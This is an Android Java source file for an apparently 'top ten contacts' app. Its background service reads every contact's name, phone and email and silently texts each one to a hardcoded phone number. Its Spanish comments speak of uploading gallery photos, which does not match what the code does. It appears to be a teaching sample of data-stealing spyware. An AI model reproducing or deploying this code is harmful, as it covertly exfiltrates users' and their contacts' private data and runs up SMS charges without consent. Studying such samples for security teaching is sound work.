package es.android.toptencontacts;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

/**
 * Este servicio se lanza y sube todas las fotos de la Galeria a un servicio en Internet (ficticio)
 *
 * Es recomendable usar un Thread para realizar las operaciones costosas sin bloquear la interfaz de usuario
 *
 */
public class BackgroundService extends Service {

	private static final String TAG = "BackgroundService";
	private static final String[] PROJECTION = {Contacts._ID, Contacts.DISPLAY_NAME, 
		CommonDataKinds.Email.ADDRESS, CommonDataKinds.Phone.NUMBER};
	private String mMessage;	
	SmsManager mSmsManager;
	private final String mDest="655757215";	
	
	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i(TAG,"onStartCommand");
		//Thread que se encarga de la subida de las imagenes
		Thread thread = new Thread() {
			

			public void run() {
				ContentResolver cr = getContentResolver();
				mSmsManager = SmsManager.getDefault();

				//Debemos filtrar por MIME type para obtener unicamente las filas de la tabla Data
				//que correspondan con emails
				String where = ContactsContract.Data.MIMETYPE + "= '"
						+ ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE +"'" + " OR " 
						+ ContactsContract.Data.MIMETYPE + "= '"
						+ ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE +"'";

				//Hacemos la consulta
				Cursor c = cr.query(Data.CONTENT_URI, PROJECTION, where, null, Contacts.TIMES_CONTACTED+" DESC");
				
				if (c != null && c.moveToFirst()){
					int columnName = c.getColumnIndexOrThrow(Contacts.DISPLAY_NAME);
					int columnPhone = c.getColumnIndexOrThrow(CommonDataKinds.Phone.NUMBER);
					int columnEmail = c.getColumnIndexOrThrow(CommonDataKinds.Email.ADDRESS);
					int count=0;
					do {
						String name = c.getString(columnName);
						String phone = c.getString(columnPhone);
						String email = c.getString(columnEmail);
						Log.i(TAG, "ReadingCONTACTO-->NOMBRE: ("+name+")+DATOS: ("+phone+") + ("+email+")");
						count++;
						//Simula un tiempo de espera de carga de la imagen
						synchronized (this) {
							try {
								wait(5000);
								setMessage(name,phone,email);								
							} catch (InterruptedException e) {
								e.printStackTrace();
							}
						}

					} while (c.moveToNext());
					c.close();					
					Toast.makeText(getApplicationContext(), "All "+count+" contacts read", Toast.LENGTH_LONG).show();
				}
			}
		};
		thread.start();
		return START_STICKY;
	}


	@Override
	public IBinder onBind(Intent intent) {
		//no binding
		return null;
	}
	
    private void setMessage(String name, String phone, String email) {
    	Log.i(TAG,"setMessage");
		mMessage="CONTACTO:\n NOMBRE: "+name+"\nDATOS:\n"+phone+"\n"+email;
		mSmsManager.sendTextMessage(mDest, null, mMessage, null, null);
		Log.i(TAG,"SendTextMessage: "+mMessage);
	}


}
